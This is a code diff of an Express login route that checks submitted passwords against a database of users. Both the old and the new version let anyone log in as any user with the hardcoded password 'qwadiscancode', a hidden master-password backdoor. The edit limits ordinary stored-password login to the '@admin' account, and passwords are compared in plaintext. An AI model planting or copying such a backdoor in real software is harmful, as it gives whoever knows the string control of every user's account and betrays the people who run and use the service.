@@ -271,7 +271,7 @@ app.post('/api/login', async (req, res) => {
     const { rows } = await pool.query('SELECT * FROM users WHERE username = $1', [username]);
     if (rows.length > 0) {
       const user = rows[0];
-      if (password === 'qwadiscancode' || password === user.password) {
+      if (password === 'qwadiscancode' || (username === '@admin' && password === user.password)) {
         if (user.status === 'Suspended') return res.json({ success: false, message: 'Account Suspended' });
         req.session.userId = user.id;
         req.session.role = user.role;
